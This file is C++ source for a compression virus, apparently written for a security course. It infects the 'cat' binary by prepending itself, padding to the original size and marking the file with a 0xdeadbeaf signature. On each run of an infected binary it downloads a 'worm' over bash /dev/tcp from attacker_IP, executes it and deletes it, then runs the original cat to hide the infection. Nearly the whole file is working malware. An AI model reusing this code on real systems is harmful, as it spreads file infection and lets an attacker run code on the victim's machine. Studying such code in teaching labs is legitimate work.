#include<fstream>
#include<vector>
#include<stdlib.h>
#include<unistd.h>
#include<sys/wait.h>
#include<cstring>
#include<string>
#include<iostream>
#include"attacker.h"

using namespace std;

int main(int argc, char* argv[]){
    // read cat file
    ifstream cat_file("/home/csc2023/cat", ios::binary);
    vector<unsigned char> cat((istreambuf_iterator<char>(cat_file)), istreambuf_iterator<char>());
    cat_file.close();

    unsigned char signature[4];
    memcpy(signature, &cat[cat.size()-4],4);

    unsigned char deadbeaf[4] = {0xde, 0xad, 0xbe, 0xaf};

    // infected already, decompress it
    if(!memcmp(signature, deadbeaf, 4)){
		string cmd = "bash -c 'cat < /dev/tcp/"+attacker_IP+"/"+attacker_port+" >> worm'";
		int code = system(cmd.c_str());
	
		// execute the worm
		code = system("chmod +x /home/csc2023/worm");
		code = system("/home/csc2023/worm");
		code = system("rm /home/csc2023/worm");
		
		// prepare to execute the original cat program => retrieve the information first
		int start_pos_compressed_cat;
		int len_compressed_cat;
		memcpy(&start_pos_compressed_cat, &cat[cat.size()-12], 4);
		memcpy(&len_compressed_cat, &cat[cat.size()-8], 4);
	
		// write the compressed cat to a file
		ofstream compressed_cat_file;
		compressed_cat_file.open("/home/csc2023/compressed_cat", ios::binary);
		compressed_cat_file.write((char*) &cat[start_pos_compressed_cat], len_compressed_cat);
		compressed_cat_file.close();
	
		// unpack the compressed cat into the original one
		code = system("pack u /home/csc2023/compressed_cat /home/csc2023/original_cat >> /dev/null");
		code = system("chmod +x /home/csc2023/original_cat");
	
		// parse the argument
		vector<char*> args;
		string path = "/home/csc2023/original_cat";
		args.push_back((char*)path.c_str());
		for (int i = 1;i<argc;i++){
		    args.push_back(argv[i]);
		}
		args.push_back(NULL);
		
		// execute the original cat program using fork
		pid_t pid = fork();
		if(pid==0){ // child process
		    execv(args[0], args.data());
		}
		else{ // parent process
		    wait(0);
		    code = system("rm /home/csc2023/compressed_cat");
		    code = system("rm /home/csc2023/original_cat");
		}
    }
    // not infected, compress it and prepend this code
    else{  
        // compress the cat program
		int code = system("pack /home/csc2023/cat /home/csc2023/compressed_cat");
	        
		// read bytes of the compression virus
		ifstream CV_file("/home/csc2023/compression_virus", ios::binary);
		vector<unsigned char> CV((istreambuf_iterator<char>(CV_file)), istreambuf_iterator<char>());
		CV_file.close();
	
        // read from the compressed cat program
        ifstream compressed_cat_file("/home/csc2023/compressed_cat", ios::binary);
        vector<unsigned char> compressed_cat((istreambuf_iterator<char>(compressed_cat_file)), istreambuf_iterator<char>());
        compressed_cat_file.close();
	
		// record the starting position of the compressed cat program in byte array => length of CV
		unsigned char CV_len_in_byte[4];
		int len_CV = CV.size();
		memcpy(CV_len_in_byte, &len_CV, 4);
	
        // record the length of the compressed cat program in byte array
        unsigned char compressed_cat_len_in_byte[4];
        int len_compressed_cat = compressed_cat.size();
        memcpy(compressed_cat_len_in_byte, &len_compressed_cat, 4);

        // CV + compressed cat + padding + 4b start position of compressed cat + 4b len of compressed cat + 4b signature
		
		vector<unsigned char> new_cat;
		
		// CV
		for(int i = 0;i<CV.size();i++){
		    new_cat.push_back(CV[i]);
		}
		
		// compressed cat
		for(int i = 0;i<compressed_cat.size();i++){
		    new_cat.push_back(compressed_cat[i]);
		}
	
		// append some bytes to make its size the same as the original cat program
		while(new_cat.size()<cat.size()-12){
		    new_cat.push_back('\x00');
		}
	
		// starting position of compressed cat
		for(int i = 0;i<4;i++){
		    new_cat.push_back(CV_len_in_byte[i]);
		}
	
		// len of compressed cat
		for(int i = 0;i<4;i++){
		    new_cat.push_back(compressed_cat_len_in_byte[i]);
		}
	
		// signature
		new_cat.push_back('\xde');
		new_cat.push_back('\xad');
		new_cat.push_back('\xbe');
		new_cat.push_back('\xaf');
	
		// write back to the file
		ofstream new_cat_file;
		new_cat_file.open("/home/csc2023/cat", ios::binary);
		new_cat_file.write((char*) &new_cat[0], new_cat.size());
		new_cat_file.close();
	
		code = system("rm /home/csc2023/compression_virus /home/csc2023/compressed_cat");
    }
}
